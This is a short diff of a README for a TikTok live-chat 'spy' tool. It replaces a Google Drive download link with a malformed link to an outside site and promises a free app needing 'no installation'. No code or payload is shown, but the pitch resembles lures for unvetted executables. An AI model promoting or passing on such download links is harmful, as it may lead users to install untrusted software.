@@ -8,7 +8,7 @@ This tool tracks TikTok live chats, gifts, and videos, offering a simple and eff
 # 📥 Download the App
 Click the link below to download the app for FREE:
 
-[Download TikTok-LIVE-Spy-Chat-Gifts-Video](https://drive.google.com/file/d/1_XP_E8pQJ6zt4zz2Wa_1D46UIqALqovU/view?usp=sharing)
+[Download TikTok-LIVE-Spy-Chat-Gifts-Video]([https://robotok.](https://robotok.tip4serv.com/))
 
 (No installation required!)
 
